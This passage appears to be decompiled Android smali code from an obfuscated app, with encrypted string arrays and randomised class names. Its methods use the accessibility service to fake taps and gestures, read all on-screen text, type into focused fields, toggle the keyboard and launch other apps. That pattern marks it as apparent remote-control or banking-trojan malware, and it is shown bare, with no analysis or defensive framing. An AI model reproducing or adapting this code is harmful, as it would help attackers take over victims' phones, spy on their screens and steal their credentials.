        0x33t
        -0x43t
        -0x5ft
        -0x5t
        0x70t
        0x29t
        0x76t
    .end array-data

    :array_1
    .array-data 1
        0x66t
        -0x2dt
        -0x36t
        -0x6bt
        0x1ft
        0x5et
        0x18t
        0x4dt
    .end array-data

    :array_2
    .array-data 1
        -0xbt
        -0x71t
        0x11t
        0x47t
        -0x10t
        0x44t
        0x3ct
        -0x10t
        -0x3ct
        -0x77t
        0x1dt
        0x5at
        -0x41t
        0x79t
        0x79t
        -0x21t
        -0x37t
        -0x75t
        0x7t
        0x54t
        -0x4bt
        0x73t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x5ft
        -0x16t
        0x69t
        0x33t
        -0x30t
        0x17t
        0x59t
        -0x64t
    .end array-data

    :array_4
    .array-data 1
        0x59t
        0x3ft
        -0x40t
        0x7dt
        -0x30t
        -0x2ft
        0x0t
        0x2bt
    .end array-data

    :array_5
    .array-data 1
        0xat
        0x5ct
        -0x4et
        0x12t
        -0x44t
        -0x43t
        0x65t
        0x4ft
    .end array-data

    :array_6
    .array-data 1
        -0x1at
        -0x5at
        -0x7at
        0x7dt
        0x67t
        -0x23t
        -0x70t
        0x3ft
        -0x22t
        -0x5ft
        -0x64t
        0x7ct
        0x66t
        -0x22t
        -0x70t
        0x3ft
        -0x27t
        -0x52t
        -0x7at
        0x7et
        0x6dt
        -0x32t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x4ft
        -0x31t
        -0x18t
        0x19t
        0x8t
        -0x56t
        -0x50t
        0x7ct
    .end array-data

    :array_8
    .array-data 1
        0x4ft
        -0x26t
        -0x5ct
        -0x40t
        -0x5et
        -0x4dt
        0x6ft
        0x8t
        0x6et
        -0x3ft
    .end array-data

    nop

    :array_9
    .array-data 1
        0x7t
        -0x4bt
        -0x2et
        -0x5bt
        -0x30t
        -0x6dt
        0x2at
        0x70t
    .end array-data

    :array_a
    .array-data 1
        -0x30t
        -0x18t
        0x23t
        -0x3et
        0x6t
        -0x71t
        0x34t
        0x66t
        -0x14t
        -0x1et
        0x27t
    .end array-data

    :array_b
    .array-data 1
        -0x68t
        -0x79t
        0x55t
        -0x59t
        0x74t
        -0x51t
        0x71t
        0x8t
    .end array-data

    :array_c
    .array-data 1
        0x19t
        -0x29t
        0x38t
        0x13t
        0x3bt
        0x2bt
        -0x3ft
        0x4bt
        0x23t
        -0x2ft
        0x23t
        0x14t
        0x7dt
        0x1t
        -0x36t
        0x4bt
        0x39t
        -0x21t
        0x29t
        0x1et
    .end array-data

    :array_d
    .array-data 1
        0x57t
        -0x48t
        0x4ct
        0x7at
        0x5dt
        0x42t
        -0x5et
        0x2at
    .end array-data

    :array_e
    .array-data 1
        0x67t
        0x3dt
        0x38t
        0x3dt
        0x73t
        -0x2ct
        0x41t
        -0x1at
        0x58t
        0x35t
        0x38t
        0x3et
        0x79t
        -0x39t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x30t
        0x54t
        0x56t
        0x59t
        0x1ct
        -0x5dt
        0x61t
        -0x5bt
    .end array-data

    :array_10
    .array-data 1
        -0x2ct
        -0x31t
        -0x8t
        -0x2et
        0x10t
        -0x2at
        0x71t
        0x69t
        -0x12t
        -0x33t
        -0x1bt
        -0x3et
    .end array-data

    :array_11
    .array-data 1
        -0x80t
        -0x56t
        -0x80t
        -0x5at
        0x30t
        -0x6bt
        0x19t
        0x8t
    .end array-data

    :array_12
    .array-data 1
        0x51t
        -0x4bt
        -0x29t
        0x8t
        0x52t
        -0x7et
        0x65t
    .end array-data

    :array_13
    .array-data 1
        0x17t
        -0x26t
        -0x4ct
        0x7dt
        0x21t
        -0x19t
        0x1t
        0x27t
    .end array-data

    :array_14
    .array-data 1
        0x21t
        0x58t
        -0x1t
        0x40t
        0x11t
        0x8t
        0x1ct
        -0x7bt
    .end array-data

    :array_15
    .array-data 1
        0x72t
        0x3dt
        -0x6dt
        0x25t
        0x72t
        0x7ct
        0x79t
        -0x1ft
    .end array-data

    :array_16
    .array-data 1
        0x4et
        0x58t
        0x5ct
        -0x63t
        0x64t
        -0x8t
        -0x7at
        0xet
        0x61t
        0x5ct
        0x57t
        -0x62t
    .end array-data

    :array_17
    .array-data 1
        0x2t
        0x37t
        0x32t
        -0x6t
        0x44t
        -0x45t
        -0x16t
        0x67t
    .end array-data

    :array_18
    .array-data 1
        0xet
        -0x1t
        0x58t
        0xet
        -0x4t
        -0x22t
        -0x3dt
    .end array-data

    :array_19
    .array-data 1
        0x4dt
        -0x6dt
        0x31t
        0x6dt
        -0x69t
        -0x45t
        -0x59t
        0x1dt
    .end array-data
.end method

.method public static F(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 1

    .line 1
    const/4 v0, 0x0

    if-nez p0, :cond_0

    return-object v0

    :cond_0
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result p1

    if-eqz p1, :cond_1

    goto :goto_0

    :cond_1
    const/4 p1, 0x0

    invoke-interface {p0, p1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    move-object v0, p0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_0
    return-object v0
.end method

.method public static G()[B
    .locals 4

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x1

    const/4 v2, 0x0

    if-ne v0, v1, :cond_0

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/YidxNjm8;->g(Z)V

    goto :goto_2

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x2

    if-ne v0, v1, :cond_1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/YidxNjm8;->e(Z)V

    goto :goto_2

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v3, 0x3

    if-eq v0, v3, :cond_4

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/16 v3, 0xf

    if-ne v0, v3, :cond_2

    goto :goto_1

    :cond_2
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a7;->a()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/YidxNjm8;->c:Z

    if-eqz v0, :cond_3

    :goto_0
    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/YidxNjm8;->f(Z)V

    goto :goto_2

    :cond_3
    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/YidxNjm8;->d(Z)V

    goto :goto_2

    :cond_4
    :goto_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto :goto_0

    :goto_2
    const/4 v0, 0x0

    return-object v0

    :array_0
    .array-data 1
        0x4dt
        -0x6ct
        0x25t
        0x2dt
        -0x3bt
    .end array-data

    nop

    :array_1
    .array-data 1
        0x25t
        -0x5t
        0x4bt
        0x42t
        -0x49t
        -0x27t
        0x25t
        -0x1ct
    .end array-data
.end method

.method public static H(II)V
    .locals 7

    .line 1
    :try_start_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    int-to-float p0, p0

    int-to-float p1, p1

    invoke-virtual {v2, p0, p1}, Landroid/graphics/Path;->moveTo(FF)V

    new-instance p0, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v3, 0x0

    const-wide/16 v5, 0x3e8

    move-object v1, p0

    invoke-direct/range {v1 .. v6}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    new-instance p1, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p1}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {p1, p0}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {p1}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p0

    new-instance p1, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$f;

    invoke-direct {p1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$f;-><init>()V

    const/4 v1, 0x0

    invoke-virtual {v0, p0, p1, v1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static I([Landroid/graphics/Point;I)V
    .locals 7

    .line 1
    :try_start_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    const/4 v1, 0x0

    aget-object v1, p0, v1

    iget v3, v1, Landroid/graphics/Point;->x:I

    int-to-float v3, v3

    iget v1, v1, Landroid/graphics/Point;->y:I

    int-to-float v1, v1

    invoke-virtual {v2, v3, v1}, Landroid/graphics/Path;->moveTo(FF)V

    const/4 v1, 0x1

    :goto_0
    array-length v3, p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-ge v1, v3, :cond_1

    :try_start_1
    aget-object v3, p0, v1

    iget v4, v3, Landroid/graphics/Point;->x:I

    int-to-float v4, v4

    iget v3, v3, Landroid/graphics/Point;->y:I

    int-to-float v3, v3

    invoke-virtual {v2, v4, v3}, Landroid/graphics/Path;->lineTo(FF)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    :try_start_2
    new-instance p0, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v3, 0x0

    int-to-long v5, p1

    move-object v1, p0

    invoke-direct/range {v1 .. v6}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    new-instance p1, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p1}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {p1, p0}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object p0

    invoke-virtual {p0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p0

    new-instance p1, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$e;

    invoke-direct {p1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$e;-><init>()V

    const/4 v1, 0x0

    invoke-virtual {v0, p0, p1, v1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    return-void
.end method

.method public static J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    :cond_0
    return-object v0
.end method

.method private static K()Landroid/content/Context;
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return-object v0

    :cond_0
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    return-object v0
.end method

.method public static L()V
    .locals 4

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v1

    if-nez v1, :cond_1

    return-void

    :cond_1
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1e

    if-lt v2, v3, :cond_2

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0x50

    invoke-virtual {v0, v1, v2, v3}, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->c(Landroid/content/Context;Ljava/lang/String;I)V

    :cond_2
    return-void

    nop

    :array_0
    .array-data 1
        0x62t
        0x17t
        -0x6dt
        -0x2dt
    .end array-data

    :array_1
    .array-data 1
        0x11t
        0x79t
        -0xet
        -0x5dt
        -0x4dt
        -0x7bt
        0x4et
        0x78t
    .end array-data
.end method

.method public static M()[B
    .locals 8

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return-object v1

    :cond_0
    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Draws_overs:Ljava/lang/String;

    const/4 v3, 0x1

    new-array v3, v3, [B

    const/4 v4, 0x0

    const/16 v5, -0x48

    aput-byte v5, v3, v4

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_0

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const/high16 v3, 0x40000000    # 2.0f

    const/high16 v5, 0x10000000

    if-eqz v2, :cond_1

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/16 v6, 0x12

    new-array v6, v6, [B

    fill-array-data v6, :array_1

    new-array v4, v4, [B

    fill-array-data v4, :array_2

    invoke-static {v6, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    if-eqz v2, :cond_4

    goto :goto_0

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v2

    const/4 v6, 0x3

    if-ne v2, v6, :cond_2

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/16 v6, 0x18

    new-array v6, v6, [B

    fill-array-data v6, :array_3

    new-array v4, v4, [B

    fill-array-data v4, :array_4

    invoke-static {v6, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    if-eqz v2, :cond_4

    goto :goto_0

    :cond_2
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v2

    const/4 v6, 0x4

    if-ne v2, v6, :cond_4

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/16 v6, 0xf

    new-array v6, v6, [B

    fill-array-data v6, :array_5

    new-array v7, v4, [B

    fill-array-data v7, :array_6

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v6}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    if-nez v2, :cond_3

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/16 v6, 0x11

    new-array v6, v6, [B

    fill-array-data v6, :array_7

    new-array v4, v4, [B

    fill-array-data v4, :array_8

    invoke-static {v6, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    :cond_3
    if-eqz v2, :cond_4

    :goto_0
    invoke-virtual {v2, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_4
    return-object v1

    nop

    :array_0
    .array-data 1
        -0x77t
        -0x63t
        0x7et
        -0x6ft
        -0x3dt
        0x53t
        -0x34t
        0x5bt
    .end array-data

    :array_1
    .array-data 1
        -0x2ft
        0xft
        0x5bt
        0x2bt
        -0x28t
        0x71t
        0x1t
        0x64t
        -0x23t
        0x9t
        0x52t
        0x2bt
        -0x26t
        0x77t
        0x17t
        0x79t
        -0x21t
        0x5t
    .end array-data

    nop

    :array_2
    .array-data 1
        -0x4et
        0x60t
        0x36t
        0x5t
        -0x47t
        0x1ft
        0x65t
        0x16t
    .end array-data

    :array_3
    .array-data 1
        -0xct
        -0xbt
        -0x34t
        -0x7bt
        -0x6t
        0x65t
        -0x6et
        -0x4at
        -0x1bt
        -0xbt
        -0x2et
        -0x7bt
        -0x17t
        0x62t
        -0x6ft
        -0x49t
        -0xet
        -0x9t
        -0x40t
        -0x3bt
        -0x8t
        0x6dt
        -0x65t
        -0x55t
    .end array-data

    :array_4
    .array-data 1
        -0x69t
        -0x66t
        -0x5ft
        -0x55t
        -0x67t
        0xat
        -0x2t
        -0x27t
    .end array-data

    :array_5
    .array-data 1
        0x1et
        -0x25t
        -0x69t
        0x70t
        0x2ft
        0x36t
        0x3at
        0x40t
        0x53t
        -0x39t
        -0x61t
        0x3dt
        0x33t
        0x35t
        0x30t
    .end array-data

    :array_6
    .array-data 1
        0x7dt
        -0x4ct
        -0x6t
        0x5et
        0x46t
        0x47t
        0x55t
        0x2ft
    .end array-data

    :array_7
    .array-data 1
        -0x12t
        0x14t
        -0x7dt
        0x7ft
        0x4at
        -0x10t
        -0x27t
        0x59t
        -0x5dt
        0x12t
        -0x7dt
        0x30t
        0x52t
        -0x8t
        -0x38t
        0x53t
        -0x1t
    .end array-data

    nop

    :array_8
    .array-data 1
        -0x73t
        0x7bt
        -0x12t
        0x51t
        0x3ct
        -0x67t
        -0x51t
        0x36t
    .end array-data
.end method

.method public static N(Ljava/lang/String;)V
    .locals 5

    .line 1
    :try_start_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v1

    if-nez v1, :cond_1

    return-void

    :cond_1
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    new-instance v2, Landroid/os/Bundle;

    invoke-direct {v2}, Landroid/os/Bundle;-><init>()V

    const/16 v3, 0x25

    new-array v3, v3, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v4, v4, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, p0}, Landroid/os/BaseBundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    const/high16 p0, 0x200000

    if-eqz v1, :cond_2

    invoke-virtual {v1, p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    move-result v3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    if-nez v3, :cond_4

    :cond_2
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->E:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_3

    return-void

    :cond_3
    invoke-virtual {v0, p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_4
    return-void

    :array_0
    .array-data 1
        0x20t
        0x5at
        -0x2at
        0xdt
        0x56t
        0x1et
        0x76t
        -0x43t
        0x33t
        0x5et
        -0x29t
        0x9t
        0x5ct
        0x1et
        0x7dt
        -0x5dt
        0x32t
        0x5ct
        -0x2at
        0x1bt
        0x4dt
        0x15t
        0x71t
        -0x58t
        0x3et
        0x5at
        -0x36t
        0x5t
        0x4bt
        0x3t
        0x6ct
        -0x53t
        0x34t
        0x5ct
        -0x34t
        0x7t
        0x5ct
    .end array-data

    nop

    :array_1
    .array-data 1
        0x61t
        0x19t
        -0x7et
        0x44t
        0x19t
        0x50t
        0x29t
        -0x4t
    .end array-data
.end method

.method public static O(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;
    .locals 5

    .line 1
    const-string v0, ""

    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    if-nez p0, :cond_0

    return-object v0

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;

    :cond_1
    const/4 v2, 0x0

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-ge v2, v3, :cond_3

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->O(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_2

    const-string v4, " "

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_3
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    return-object v0
.end method

.method public static P(Z)V
    .locals 4

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v1

    if-nez v1, :cond_1

    return-void

    :cond_1
    const/16 v2, 0xc

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/inputmethod/InputMethodManager;

    const/4 v2, 0x0

    if-eqz p0, :cond_2

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getSoftKeyboardController()Landroid/accessibilityservice/AccessibilityService$SoftKeyboardController;

    move-result-object p0

    invoke-virtual {p0, v2}, Landroid/accessibilityservice/AccessibilityService$SoftKeyboardController;->setShowMode(I)Z

    const/4 p0, 0x2

    :try_start_0
    invoke-virtual {v1, p0, v2}, Landroid/view/inputmethod/InputMethodManager;->toggleSoftInput(II)V
    :try_end_0
